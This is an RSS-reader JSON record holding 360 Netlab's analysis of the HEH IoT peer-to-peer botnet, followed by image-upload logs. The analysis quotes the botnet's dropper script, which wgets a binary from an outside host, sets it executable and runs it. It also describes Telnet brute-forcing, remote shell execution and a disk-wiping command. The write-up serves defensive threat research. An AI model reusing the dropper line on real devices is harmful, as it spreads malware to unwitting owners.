{"code":1,"isDone":false,"toInsertArticleList":[{"createdTime":"2020-10-09 21:42:41","updatedTime":"2020-10-09 21:42:41","title":"HEH, a new IoT P2P Botnet going after weak telnet services","link":"https://blog.netlab.360.com/heh-an-iot-p2p-botnet/","description":"<h2 id=\"overview\">Overview</h2><p>Recently, 360Netlab threat detection system captured a batch of unknown samples. The CPU architectures supported by this batch of samples are broad, including x86(32/64), ARM(32/64), MIPS(MIPS32/MIPS-III) and PPC, it is spreading through brute force of the <strong>Telnet</strong> service on ports <strong>23/2323, </strong>which means the bot does not really care of what the end devices are, as long as it can enter the device, it will try its luck to infect the target. The botnet is written in Go language, and uses proprietary P2P protocol, we named it <strong>HEH Botnet</strong> .  </p><p>Based on the parsing result of <strong>go_parser </strong>(A tool I wrote, check it out at GitHub <a href=\"https://github.com/0xjiayu/go_parser\"><strong>here</strong></a>), the HEH sample we captured was constructed by <strong>Go 1.15.1</strong> . The source code files used to build the binary file are listed as follows:</p><pre><code>/mnt/c/Users/brand/go/src/heh/attack.go\n/mnt/c/Users/brand/go/src/heh/commands.go\n/mnt/c/Users/brand/go/src/heh/structFun.go\n/mnt/c/Users/brand/go/src/heh/cryptotext.go\n/mnt/c/Users/brand/go/src/heh/httpserver.go\n/mnt/c/Users/brand/go/src/heh/killer.go\n/mnt/c/Users/brand/go/src/heh/main.go\n/mnt/c/Users/brand/go/src/heh/network.go\n/mnt/c/Users/brand/go/src/heh/peerlist.go\n/mnt/c/Users/brand/go/src/heh/portkill.go\n/mnt/c/Users/brand/go/src/heh/services.go\n/mnt/c/Users/brand/go/src/heh/telnet.go\n</code></pre>\n<p>Note that the project inside the sample is named <strong>heh</strong>. According to the characteristics of the source file path, we can also confirm that the family samples were built by the author in the WSL environment on the Windows platform.</p><h2 id=\"function-description\">Function description</h2><p>The HEH Botnet sample contains three functional modules: propagation module, local HTTP service module and P2P module. The outline flow chart is as follows:</p><figure class=\"kg-card kg-image-card\"><img src=\"https://blog.netlab.360.com/content/images/2020/09/HEHBotnet.png\" class=\"kg-image\"></figure><h2 id=\"detailed-analysis\">Detailed analysis</h2><h3 id=\"initial-stage\">Initial stage</h3><p>The HEH Botnet samples we captured was originally downloaded and executed by a malicious Shell script named <strong>wpqnbw.txt</strong> . The malicious Shell script then downloads and executes every single one of the malicious programs for all different CPU architectures, there is no environment checking or things like that, just run all the programs in turn. The malicious scripts and binary programs are hosted on <strong>pomf.cat</strong> Site(note here, prmf.cat is legit website, don’t block it). The beginning of <strong>wpqnbw.txt</strong> (similar to the subsequent content):</p><pre><code>#!/bin/bash\ncd /tmp || cd /var/run || cd /mnt || cd /root || cd /\nwget hxxp://a.pomf.cat/xggxyk\nbusybox wget hxxp://a.pomf.cat/xggxyk\nchmod 777 xggxyk; busybox chmod 777 xggxyk; sh xggxyk &#34;$1 3&#34;\n</code></pre>\n<p>The parameters passed in when the malicious sample is started, the first parameter is an IP address, the default is the external IP of the compromised machine, theoretically it can also be the IP address of a certain Peer; the second parameter is the Daemon Flag, if you set this parameter is <strong>3</strong> , the sample will start running in daemon mode.</p><p>After the sample is started, a series of service processes will be killed according to the port number:</p><p><img src=\"https://blog.netlab.360.com/content/images/2020/09/kill_serv_by_ports.png\" alt=\"\"></p>\n<p>Then, the HEH sample will start an HTTP Server on the local port <code>:80</code> :</p><figure class=\"kg-card kg-image-card\"><img src=\"https://blog.netlab.360.com/content/images/2020/09/start_http_serv.png\" class=\"kg-image\"></figure><h3 id=\"universal-declaration-of-human-rights\">Universal Declaration of Human Rights</h3><p>The initial state of this HTTP Server will be set <code>:80/0</code> to <code>:80/9</code> a total of 10 URIs, correspondingly, the Universal Declaration of Human Rights in 8 languages and 2 empty contents are displayed. For example, the <code>:80/0</code> returns the  Chinese version of the “Universal Declaration of Human Rights” .</p><figure class=\"kg-card kg-image-card\"><img src=\"https://blog.netlab.360.com/content/images/2020/09/http_server.png\" class=\"kg-image\"></figure><p>The 8 versions:</p><figure class=\"kg-card kg-image-card\"><img src=\"https://blog.netlab.360.com/content/images/2020/09/human_right_decl.png\" class=\"kg-image\"></figure><p>These initial contents of the Universal Declaration of Human Rights will soon be overwritten by the data pulled by the sample from Peer's HTTP service port, and these contents can also be updated through specific instructions in the P2P protocol.</p><h3 id=\"p2p-module\">P2P module</h3><p>When the P2P module of HEH Botnet is initialized, there are two key steps:</p><ol><li>Initialize the Peer List object, which is a global variable of the <strong>Slice </strong>type, with an initial length of <strong>1000</strong> . This PeerList should be defined in Go language as follows:</li></ol><pre><code>package main\nimport &#34;net&#34;\n\ntype Peer struct {\n\taddr                 net.UDPAddr\n\texpirationTimer uint8\n}\n\nvar peerList []Peer\n</code></pre>\n<p>2. Update the HTTP response data. By the <code>argv[1]</code> <strong>: 80</strong> the HTTP request to the service port of the HTTP URI 0 ~ 9, to update their respective data. According to the behavior of the sample, the data updated here is an <strong>executable binary file</strong> .</p><p>The P2P module of HEH Botnet mainly consists of 3 components:</p><ol><li><strong>Ping </strong>component: every 10s, a <strong>Ping</strong> command will be sent to each and every Peer's UDP service port in a 0.1 second interval. </li><li><strong>Peer update</strong> component: every 10s, a bunch of Peer <strong>Update</strong> commands will also be sent to random Peers’ UDP service port in the same 0.1 second interval. After receiving the command, the peer will check whether its Peer List already contains the Peer address information. If not, add the Peer address information to its Peer List.</li><li><strong>UDP service </strong>component: The local Peer service of HEH Botnet is a UDP service. This service monitors data or instructions sent by other Peers, analyzes the instructions and performs corresponding operations.</li></ol><p>This article focuses on the UDP service component of HEH Botnet. This component has two key functions: <strong>UDP service port number generation</strong> and <strong>command parsing</strong> .</p><p>The UDP service port of HEH Botnet is not fixed, nor is it randomly generated, but is calculated based on Peer's own public network IP. Each time HEH Bot receives a new Peer's IP address, it will calculate the Peer's UDP port according to the algorithm, and pack this information into its Peer List. The port generation algorithm is implemented in the function <strong>main.portGenerator()</strong> . The key parts are as follows:</p><p><img src=\"https://blog.netlab.360.com/content/images/2020/09/port_gen.png\" alt=\"\"></p>\n<p>The instructions that HEH Bot can parse are divided into two categories: P2P protocol-related functional instructions ( <strong>Protocol OpCode</strong> ) and Bot-specific control instructions ( <strong>Bot Cmd</strong> ). The Protocol OpCode is located in <strong>the first byte of the UDP data</strong> and is classified as follows:</p><table>\n<thead>\n<tr>\n<th>OpCode</th>\n<th style=\"text-align:center\">Ins Len(Bytes)</th>\n<th style=\"text-align:left\">Meaning</th>\n<th style=\"text-align:left\">Operation</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>2</strong></td>\n<td style=\"text-align:center\">1</td>\n<td style=\"text-align:left\"><strong>Ping</strong></td>\n<td style=\"text-align:left\">Response a <strong>Pong</strong> to the peer</td>\n</tr>\n<tr>\n<td><strong>3</strong></td>\n<td style=\"text-align:center\">1</td>\n<td style=\"text-align:left\"><strong>Pong</strong></td>\n<td style=\"text-align:left\">-</td>\n</tr>\n<tr>\n<td><strong>4</strong></td>\n<td style=\"text-align:center\">1</td>\n<td style=\"text-align:left\"><strong>Announce</strong> (itself as a Peer)</td>\n<td style=\"text-align:left\">Add this peer to self's Peer List, and response an <strong>Announce</strong></td>\n</tr>\n<tr>\n<td><strong>5</strong></td>\n<td style=\"text-align:center\">1</td>\n<td style=\"text-align:left\"><strong>PeerUpdate</strong>(Let peer update its PeerList)</td>\n<td style=\"text-align:left\">Update Peer List</td>\n</tr>\n<tr>\n<td><strong>1</strong></td>\n<td style=\"text-align:center\">&#62; 0x229</td>\n<td style=\"text-align:left\">Control bot to do something as the Bot Cmd required</td>\n<td style=\"text-align:left\">Parse and Execute Bot Cmd</td>\n</tr>\n</tbody>\n</table>\n<p>When the instruction code is <strong>1</strong> , it means that the instruction is a control instruction code for Bot. The meaning of the starting 0x229 Bytes of  data for this type of command is fixed. It contains the Sha256 Hash Value and PSS Signature used for verification in turn, and finally there is an additional verification field of 8 Bytes; the actual command data is from 0x229 bytes onwards. Take No. <strong>7</strong> Bot Cmd (<strong>Cmd.UpdateBotFile</strong>) as an example, the instruction data structure is as follows:</p><figure class=\"kg-card kg-image-card\"><img src=\"https://blog.netlab.360.com/content/images/2020/09/bot_cmd_st.png\" class=\"kg-image\"></figure><p>HEH Bot verifies the received Bot Cmd data in 3 steps:</p><ol><li>Check the length of the command data and Extra Flag;</li><li>Use PSS Signature to verify command data;</li><li>Check the Sha256 Hash of the last real cmd data.</li></ol><p>The logic of the last two steps is as follows:</p><figure class=\"kg-card kg-image-card\"><img src=\"https://blog.netlab.360.com/content/images/2020/09/cmd_verify.png\" class=\"kg-image\"></figure><p>Among them, the public key used when verifying PSS Signature is:</p><pre><code>-----BEGIN PUBLIC KEY-----\nMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA3c1Jzopt9E4+cDwTMKUo\nuBSfu9DoFYctD6OIkiZqE1iF5sJPOr6xhU+nV9sebcAClnO9+6YvlKDIVVwjzNbm\njcfUAYyq8FSLJrifEYvT2LYkYYy/SNKcaaTmAKCJ3ACSXpjhcr6WW5/05ygBShVo\nE0q+fVhVTqnkOPpIowuHs9RH0DcuGsxKYXTQizuC0Xa0HrfUrnI7FWNSUfm8v1mA\n3FnlikNdTMrlRItnRCGIj+8tyiyvyQAi0/SWrfZLG+HzMgxf+wVBfD9H2XTUcUWX\nuoDIlSRIJJkN88dJ+uf1dlHlCqhF9TrimpzALq+OhSd1alUaf+PFINSrjNuIc+wU\n9cuYQeD6kMynXu7bKTVqKPz8M0EathmduOthNL7WUhcKUppyyBIfkVmH9cnxWcZu\njPpnGH9n5Djy1QaexRT9JBx7eNSps31cZ9/rQgO05SlA4KFZARCIXNPZmGOZmL8Y\n33dPu29ykF02kiOau6SyLgRW2bIudMCrhL82fSo6zSNCXOby8VE3j/BCfn2lx5oI\nn5ES65zs2GuF3DGfwheNLiaajV5belCOMCD07TjfBfHJz0hisTy5K1UHItqHSFCa\n9EijW7uk416Ulx0HHChKAQJ8Mn2AqD1WBR4Iu20WQENJNIT7ketyCCMwJH0mO3en\nLW2/t1GOPfXptXtNmdzp01sCAwEAAQ==\n-----END PUBLIC KEY-----\n</code></pre>\n<p>The Bot Cmd supported by HEH Bot are as follows:</p><table>\n<thead>\n<tr>\n<th>Cmd Code</th>\n<th>Meaning</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>0</strong></td>\n<td><strong>Restart</strong>: Restart the Bot</td>\n</tr>\n<tr>\n<td><strong>2</strong></td>\n<td><strong>Exit</strong>: Exit current running bot</td>\n</tr>\n<tr>\n<td><strong>3</strong></td>\n<td><strong>Attack</strong>:  launch attacks ( <strong>not implemented</strong> )</td>\n</tr>\n<tr>\n<td><strong>4</strong></td>\n<td><strong>Execute</strong>: Execute Shell Commond</td>\n</tr>\n<tr>\n<td><strong>5</strong></td>\n<td><strong>Print</strong>: <strong>not implemented</strong></td>\n</tr>\n<tr>\n<td><strong>6</strong></td>\n<td><strong>PeerUpdate</strong>: Update Peer List</td>\n</tr>\n<tr>\n<td><strong>7</strong></td>\n<td><strong>UpdateBotFile</strong>: By specifying a file download link, let the bot download and update the content of the file held by the bot. This file will be used as HTTP Response Data by the local HTTP Server which launched by the bot</td>\n</tr>\n<tr>\n<td><strong>8</strong></td>\n<td><strong>SelfDestruct</strong>: Destruct the device</td>\n</tr>\n<tr>\n<td><strong>9</strong></td>\n<td><strong>Misc</strong>: <strong>not implemented</strong></td>\n</tr>\n</tbody>\n</table>\n<p>At present, the most useful functions for the entire Botnet are to <strong>execute Shell commands</strong>, <strong>update Peer List</strong> and <strong>UpdateBotFile</strong>. The <strong>Attack</strong> function in the code is just a reserved empty function, and has not been implemented. It can be seen that the Botnet is still in the developement stage. We will see what the author comes up with the <strong>Attack</strong> feature.</p><p>The function for parsing Bot Cmd in Bot is <strong>main.executeCommand()</strong> . The overall structure of this function is as follows:</p><figure class=\"kg-card kg-image-card\"><img src=\"https://blog.netlab.360.com/content/images/2020/09/exec_cmd_func_overview.png\" class=\"kg-image\"></figure><p data-koenig-dnd-droppable=\"true\"><strong style=\"color:Red;\">Self-destruction</strong></p><p>There is one thing really worth noting here. When the Bot receives a cmd with code number <strong>8</strong> , the Bot will try to wipe out everything on all the disks through the following series of Shell commands:</p><figure class=\"kg-card kg-image-card\"><img src=\"https://blog.netlab.360.com/content/images/2020/09/self_destroy_cmd.png\" class=\"kg-image\"></figure><h3 id=\"communication-module-telnet-service-brute-force-cracking\">Communication module-Telnet service brute force cracking</h3><p>After the Bot runs the P2P module, it will execute the brute force task against the Telnet service for the two ports 23 and 2323 in a parallel manner, and then complete its own propagation.</p><p>First, the Bot will generate a random IP address, and then check whether the IP address is <strong>127.0.0.1</strong> :</p><figure class=\"kg-card kg-image-card\"><img src=\"https://blog.netlab.360.com/content/images/2020/09/random_dip.png\" class=\"kg-image\"></figure><p>If the IP address is <strong>not 127.0.0.1</strong> , the IP will be scanned. If the Telnet service is opened on port 23 or 2323, it will enter the brute force  stage. The related functions are as follows:</p><p><img src=\"https://blog.netlab.360.com/content/images/2020/09/telnet_related_func.png\" alt=\"\"></p>\n<p>The password dictionary exists in the form of global <strong>Slice</strong> variables, including <strong>171</strong> usernames and <strong>504</strong> passwords : (we are not sharing the list publicly due to security concerns) :</p><figure class=\"kg-card kg-image-card\"><img src=\"https://blog.netlab.360.com/content/images/2020/09/telnet_auth_dict.png\" class=\"kg-image\"></figure><p>If the attempt is successful, the bot will let the victim access the bot’s own HTTP service, and execute the corresponding file obtained through HTTP (ie the latest Bot sample) to complete the spread:</p><figure class=\"kg-card kg-image-card\"><img src=\"https://blog.netlab.360.com/content/images/2020/09/send_payload.png\" class=\"kg-image\"></figure><h2 id=\"sum-up\">Sum up</h2><p>The operating mechanism of this botnet is not yet mature, as we can see from above, some important function such as attack module have not yet been implemented. Also the P2P implementation still has flaws, the Bot does maintain a Peer List internally, and there is ongoing Ping&#60;--&#62;Pong communication between peers, but the entire Botnet still is considered centralized, as currently the bot node cannot send control command. In addition, the mechanism of carrying the sample itself through the local HTTP Server is not very pretty. With that being said, the new and developing P2P structure, the multiple CPU architecture support, the embedded self-destruction feature, all make this botnet potentially dangerous.</p><h2 id=\"contact-us\">Contact us</h2><p>Readers are always welcomed to reach us on <strong><a href=\"https://twitter.com/360Netlab\" rel=\"noopener noreferrer\">twitter</a></strong> , or email to <strong>netlab at 360 dot cn</strong>.</p><h2 id=\"ioc\">IoC</h2><p>MD5:</p><pre><code>4c345fdea97a71ac235f2fa9ddb19f05\n66786509c16e3285c5e9632ab9019bc7\n6be1590ac9e87dd7fe19257213a2db32\n6c815da9af17bfa552beb8e25749f313\n984fd7ffb7d9f20246e580e15fd93ec7\nbd07315639da232e6bb4f796231def8a\nc1b2a59f1f1592d9713aa9840c34cade\nc2c26a7b2a5412c9545a46e1b9b37b0e\n43de9c5fbab4cd59b3eab07a81ea8715</code></pre>","descriptionType":"html","publishedDate":"Tue, 06 Oct 2020 15:59:00 +0000","feedId":9360,"bgimg":"https://blog.netlab.360.com/content/images/2020/09/HEHBotnet.png","linkMd5":"2d2d0d31fa25160e426a7352f012ebce","destWidth":1404,"destHeight":1244,"sourceBytes":76995,"destBytes":67018,"author":"JiaYu","articleImgCdnMap":{"https://blog.netlab.360.com/content/images/2020/09/HEHBotnet.png":null,"https://blog.netlab.360.com/content/images/2020/09/kill_serv_by_ports.png":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn14@2020_3/2020/10/09/13-42-52-980_1981d8cf274df658.webp","https://blog.netlab.360.com/content/images/2020/09/start_http_serv.png":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn85@2020_1/2020/10/09/13-42-50-859_3195c428f7fb8f60.webp","https://blog.netlab.360.com/content/images/2020/09/http_server.png":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn22@2020_1/2020/10/09/13-43-01-616_fed2f2fa887b029c.webp","https://blog.netlab.360.com/content/images/2020/09/human_right_decl.png":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn18@2020_2/2020/10/09/13-42-51-185_c78c3e90cc348006.webp","https://blog.netlab.360.com/content/images/2020/09/port_gen.png":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn93@2020_3/2020/10/09/13-42-50-760_20a21704bb9694bb.webp","https://blog.netlab.360.com/content/images/2020/09/bot_cmd_st.png":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn90@2020_4/2020/10/09/13-42-54-022_1dc3b6853b9751c4.webp","https://blog.netlab.360.com/content/images/2020/09/cmd_verify.png":"https://cdn.jsdelivr.net/gh/myreaderx31/cdn2@2020_1/2020/10/09/13-42-53-358_a49bfa018663d940.webp","https://blog.netlab.360.com/content/images/2020/09/exec_cmd_func_overview.png":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn96@2020_5/2020/10/09/13-42-51-640_5f3df7002ac54502.webp","https://blog.netlab.360.com/content/images/2020/09/self_destroy_cmd.png":"https://cdn.jsdelivr.net/gh/myreaderx22/cdn10@2020_6/2020/10/09/13-42-51-000_202e5c76bc818cf6.webp","https://blog.netlab.360.com/content/images/2020/09/random_dip.png":null,"https://blog.netlab.360.com/content/images/2020/09/telnet_related_func.png":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn25@2020_3/2020/10/09/13-42-50-484_902a70d8796bac27.webp","https://blog.netlab.360.com/content/images/2020/09/telnet_auth_dict.png":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn82@2020_5/2020/10/09/13-42-51-493_cfc353adb120fd30.webp","https://blog.netlab.360.com/content/images/2020/09/send_payload.png":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn3@2020_6/2020/10/09/13-42-50-752_807dfd2b461e6e30.webp"},"publishedOrCreatedDate":1602250961012}],"record":{"createdTime":"2020-10-09 21:42:41","updatedTime":"2020-10-09 21:42:41","feedId":9360,"fetchDate":"Fri, 09 Oct 2020 13:42:41 +0000","fetchMs":3521,"handleMs":28,"totalMs":26427,"newArticles":0,"totalArticles":15,"status":1,"type":0,"ip":"b61367955ce0c617c692299987db8df0","hostName":"europe69*","requestId":"debaef3f8e2c4b23a9f941271cb380cf_9360","contentType":"text/xml; charset=utf-8","totalBytes":1468438,"bgimgsTotal":1,"bgimgsGithubTotal":0,"articlesImgsTotal":14,"articlesImgsGithubTotal":12,"successGithubMap":{"myreaderx8":1,"myreaderx6":1,"myreaderx32":1,"myreaderx33":1,"myreaderx22":1,"myreaderx2":1,"myreaderx13":1,"myreaderx24":1,"myreaderx30":1,"myreaderx5oss":1,"myreaderx31":1,"myreaderx29":1},"failGithubMap":{"myreaderx14":1,"myreaderx23":1}},"feed":{"createdTime":"2020-08-25 04:35:03","updatedTime":"2020-09-05 15:59:59","id":9360,"name":"360 Netlab Blog - Network Security Research Lab at 360","url":"http://blog.netlab.360.com/rss/","subscriber":null,"website":null,"icon":"https://blog.netlab.360.com/favicon.png","icon_jsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx64/cdn16@2020_1/2020/09/05/07-59-55-602_11aad37390d7d139.png","description":"Network Security Research Lab at 360","weekly":null,"link":null},"noPictureArticleList":[{"createdTime":"2020-10-09 21:43:02","updatedTime":"2020-10-09 21:43:02","id":null,"feedId":9360,"linkMd5":"2d2d0d31fa25160e426a7352f012ebce"}],"tmpCommonImgCdnBytes":0,"tmpBodyImgCdnBytes":1468438,"tmpBgImgCdnBytes":0,"extra4":{"start":1602250956264,"total":0,"statList":[{"spend":4720,"msg":"获取xml内容"},{"spend":28,"msg":"解释文章"},{"spend":0,"msg":"上传封面图到cdn"},{"spend":0,"msg":"修正封面图上传失败重新上传"},{"spend":14989,"msg":"正文链接上传到cdn"}]},"extra5":14,"extra6":14,"extra7ImgCdnFailResultVector":[{"code":1,"isDone":false,"source":"https://blog.netlab.360.com/content/images/2020/09/HEHBotnet.png","sourceStatusCode":200,"destWidth":1404,"destHeight":1244,"sourceBytes":76995,"destBytes":67018,"targetWebpQuality":75,"feedId":9360,"totalSpendMs":2412,"convertSpendMs":56,"createdTime":"2020-10-09 21:42:41","host":"us-038*","referer":"https://blog.netlab.360.com/heh-an-iot-p2p-botnet/","linkMd5ListStr":"2d2d0d31fa25160e426a7352f012ebce,2d2d0d31fa25160e426a7352f012ebce","rawMap":{"githubUrl":"https://api.github.com/repos/myreaderx23/cdn76/contents/2020/10/09/13-42-43-492_60e3ab1de08195b5.webp","resp":{"code":403,"msg":"Forbidden","body":"{\n  \"message\": \"API rate limit exceeded for user ID 69189253.\",\n  \"documentation_url\": \"https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting\"\n}\n","headerMap":{"access-control-allow-origin":["*"],"access-control-expose-headers":["ETag, Link, Location, Retry-After, X-GitHub-OTP, X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Used, X-RateLimit-Reset, X-OAuth-Scopes, X-Accepted-OAuth-Scopes, X-Poll-Interval, X-GitHub-Media-Type, Deprecation, Sunset"],"content-security-policy":["default-src 'none'"],"content-type":["application/json; charset=utf-8"],"date":["Fri, 09 Oct 2020 13:42:43 GMT"],"referrer-policy":["origin-when-cross-origin, strict-origin-when-cross-origin"],"server":["GitHub.com"],"status":["403 Forbidden"],"strict-transport-security":["max-age=31536000; includeSubdomains; preload"],"transfer-encoding":["chunked"],"vary":["Accept-Encoding, Accept, X-Requested-With"],"x-accepted-oauth-scopes":["repo"],"x-content-type-options":["nosniff"],"x-frame-options":["deny"],"x-github-media-type":["github.v3; format=json"],"x-github-request-id":["9520:53BE:428BC7:BDCC0B:5F8068C8"],"x-oauth-scopes":["admin:enterprise, admin:gpg_key, admin:org, admin:org_hook, admin:public_key, admin:repo_hook, delete:packages, delete_repo, gist, notifications, read:packages, repo, user, workflow, write:discussion, write:packages"],"x-ratelimit-limit":["60"],"x-ratelimit-remaining":["0"],"x-ratelimit-reset":["1602253111"],"x-ratelimit-used":["60"],"x-xss-protection":["1; mode=block"]},"exceptionMsg":"Unexpected code 403,url is : https://api.github.com/repos/myreaderx23/cdn76/contents/2020/10/09/13-42-43-492_60e3ab1de08195b5.webp","historyStatusCode":[],"spendMs":54},"base64UserPassword":null,"token":"df0b9******************************93a6e"},"githubUser":"myreaderx23","githubHttpCode":403,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"75.2 KB","destSize":"65.4 KB","compressRate":"87%"},{"code":1,"isDone":false,"source":"https://blog.netlab.360.com/content/images/2020/09/HEHBotnet.png","sourceStatusCode":200,"destWidth":1404,"destHeight":1244,"sourceBytes":76995,"destBytes":67018,"targetWebpQuality":75,"feedId":9360,"totalSpendMs":4037,"convertSpendMs":49,"createdTime":"2020-10-09 21:42:43","host":"us-038*","referer":"https://blog.netlab.360.com/heh-an-iot-p2p-botnet/","linkMd5ListStr":"2d2d0d31fa25160e426a7352f012ebce,2d2d0d31fa25160e426a7352f012ebce","rawMap":{"githubUrl":"https://api.github.com/repos/myreaderx23/cdn76/contents/2020/10/09/13-42-47-605_60e3ab1de08195b5.webp","resp":{"code":403,"msg":"Forbidden","body":"{\n  \"message\": \"API rate limit exceeded for user ID 69189253.\",\n  \"documentation_url\": \"https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting\"\n}\n","headerMap":{"access-control-allow-origin":["*"],"access-control-expose-headers":["ETag, Link, Location, Retry-After, X-GitHub-OTP, X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Used, X-RateLimit-Reset, X-OAuth-Scopes, X-Accepted-OAuth-Scopes, X-Poll-Interval, X-GitHub-Media-Type, Deprecation, Sunset"],"content-security-policy":["default-src 'none'"],"content-type":["application/json; charset=utf-8"],"date":["Fri, 09 Oct 2020 13:42:47 GMT"],"referrer-policy":["origin-when-cross-origin, strict-origin-when-cross-origin"],"server":["GitHub.com"],"status":["403 Forbidden"],"strict-transport-security":["max-age=31536000; includeSubdomains; preload"],"transfer-encoding":["chunked"],"vary":["Accept-Encoding, Accept, X-Requested-With"],"x-accepted-oauth-scopes":["repo"],"x-content-type-options":["nosniff"],"x-frame-options":["deny"],"x-github-media-type":["github.v3; format=json"],"x-github-request-id":["9520:53BE:428C02:BDCEB4:5F8068D5"],"x-oauth-scopes":["admin:enterprise, admin:gpg_key, admin:org, admin:org_hook, admin:public_key, admin:repo_hook, delete:packages, delete_repo, gist, notifications, read:packages, repo, user, workflow, write:discussion, write:packages"],"x-ratelimit-limit":["60"],"x-ratelimit-remaining":["0"],"x-ratelimit-reset":["1602253111"],"x-ratelimit-used":["60"],"x-xss-protection":["1; mode=block"]},"exceptionMsg":"Unexpected code 403,url is : https://api.github.com/repos/myreaderx23/cdn76/contents/2020/10/09/13-42-47-605_60e3ab1de08195b5.webp","historyStatusCode":[],"spendMs":51},"base64UserPassword":null,"token":"df0b9******************************93a6e"},"githubUser":"myreaderx23","githubHttpCode":403,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"75.2 KB","destSize":"65.4 KB","compressRate":"87%"},{"code":1,"isDone":false,"source":"https://blog.netlab.360.com/content/images/2020/09/random_dip.png","sourceStatusCode":200,"destWidth":1590,"destHeight":1394,"sourceBytes":117532,"destBytes":122360,"targetWebpQuality":75,"feedId":9360,"totalSpendMs":4951,"convertSpendMs":178,"createdTime":"2020-10-09 21:42:47","host":"us-011*","referer":"https://blog.netlab.360.com/heh-an-iot-p2p-botnet/","linkMd5ListStr":"2d2d0d31fa25160e426a7352f012ebce","rawMap":{"githubUrl":"https://api.github.com/repos/myreaderx14/cdn27/contents/2020/10/09/13-42-52-653_f89f0e713dce5e39.webp","resp":{"code":403,"msg":"Forbidden","body":"{\n  \"message\": \"API rate limit exceeded for user ID 68584859.\",\n  \"documentation_url\": \"https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting\"\n}\n","headerMap":{"access-control-allow-origin":["*"],"access-control-expose-headers":["ETag, Link, Location, Retry-After, X-GitHub-OTP, X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Used, X-RateLimit-Reset, X-OAuth-Scopes, X-Accepted-OAuth-Scopes, X-Poll-Interval, X-GitHub-Media-Type, Deprecation, Sunset"],"content-security-policy":["default-src 'none'"],"content-type":["application/json; charset=utf-8"],"date":["Fri, 09 Oct 2020 13:42:52 GMT"],"referrer-policy":["origin-when-cross-origin, strict-origin-when-cross-origin"],"server":["GitHub.com"],"status":["403 Forbidden"],"strict-transport-security":["max-age=31536000; includeSubdomains; preload"],"transfer-encoding":["chunked"],"vary":["Accept-Encoding, Accept, X-Requested-With"],"x-accepted-oauth-scopes":["repo"],"x-content-type-options":["nosniff"],"x-frame-options":["deny"],"x-github-media-type":["github.v3; format=json"],"x-github-request-id":["961A:622B:1ED9DE2:33AD582:5F8068DC"],"x-oauth-scopes":["admin:enterprise, admin:gpg_key, admin:org, admin:org_hook, admin:public_key, admin:repo_hook, delete:packages, delete_repo, gist, notifications, read:packages, repo, user, workflow, write:discussion, write:packages"],"x-ratelimit-limit":["60"],"x-ratelimit-remaining":["0"],"x-ratelimit-reset":["1602253099"],"x-ratelimit-used":["60"],"x-xss-protection":["1; mode=block"]},"exceptionMsg":"Unexpected code 403,url is : https://api.github.com/repos/myreaderx14/cdn27/contents/2020/10/09/13-42-52-653_f89f0e713dce5e39.webp","historyStatusCode":[],"spendMs":130},"base64UserPassword":null,"token":"6b67d******************************91b08"},"githubUser":"myreaderx14","githubHttpCode":403,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"114.8 KB","destSize":"119.5 KB","compressRate":"104.1%"},{"code":1,"isDone":false,"source":"https://blog.netlab.360.com/content/images/2020/09/random_dip.png","sourceStatusCode":200,"destWidth":1590,"destHeight":1394,"sourceBytes":117532,"destBytes":122360,"targetWebpQuality":75,"feedId":9360,"totalSpendMs":4727,"convertSpendMs":178,"createdTime":"2020-10-09 21:42:52","host":"us-010*","referer":"https://blog.netlab.360.com/heh-an-iot-p2p-botnet/","linkMd5ListStr":"2d2d0d31fa25160e426a7352f012ebce","rawMap":{"githubUrl":"https://api.github.com/repos/myreaderx14/cdn27/contents/2020/10/09/13-42-57-609_f89f0e713dce5e39.webp","resp":{"code":403,"msg":"Forbidden","body":"{\n  \"message\": \"API rate limit exceeded for user ID 68584859.\",\n  \"documentation_url\": \"https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting\"\n}\n","headerMap":{"access-control-allow-origin":["*"],"access-control-expose-headers":["ETag, Link, Location, Retry-After, X-GitHub-OTP, X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Used, X-RateLimit-Reset, X-OAuth-Scopes, X-Accepted-OAuth-Scopes, X-Poll-Interval, X-GitHub-Media-Type, Deprecation, Sunset"],"content-security-policy":["default-src 'none'"],"content-type":["application/json; charset=utf-8"],"date":["Fri, 09 Oct 2020 13:42:57 GMT"],"referrer-policy":["origin-when-cross-origin, strict-origin-when-cross-origin"],"server":["GitHub.com"],"status":["403 Forbidden"],"strict-transport-security":["max-age=31536000; includeSubdomains; preload"],"transfer-encoding":["chunked"],"vary":["Accept-Encoding, Accept, X-Requested-With"],"x-accepted-oauth-scopes":["repo"],"x-content-type-options":["nosniff"],"x-frame-options":["deny"],"x-github-media-type":["github.v3; format=json"],"x-github-request-id":["8ED4:5191:10B21C4:2804CE6:5F8068DC"],"x-oauth-scopes":["admin:enterprise, admin:gpg_key, admin:org, admin:org_hook, admin:public_key, admin:repo_hook, delete:packages, delete_repo, gist, notifications, read:packages, repo, user, workflow, write:discussion, write:packages"],"x-ratelimit-limit":["60"],"x-ratelimit-remaining":["0"],"x-ratelimit-reset":["1602253099"],"x-ratelimit-used":["60"],"x-xss-protection":["1; mode=block"]},"exceptionMsg":"Unexpected code 403,url is : 